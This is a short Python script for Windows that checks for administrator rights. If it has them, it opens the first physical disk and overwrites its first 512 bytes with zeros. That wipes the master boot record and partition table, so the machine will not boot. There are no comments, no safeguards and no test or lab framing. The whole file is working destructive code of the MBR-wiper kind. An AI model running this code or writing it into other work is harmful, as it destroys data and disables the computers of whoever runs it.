import ctypes

import win32con
import win32file

if ctypes.windll.shell32.IsUserAnAdmin():
    h_device = win32file.CreateFileW('\\\\.\\PhysicalDrive0', win32con.GENERIC_WRITE,
                                     win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None,
                                     win32con.OPEN_EXISTING, 0, 0)
    win32file.WriteFile(h_device, win32file.AllocateReadBuffer(512), None)
    win32file.CloseHandle(h_device)
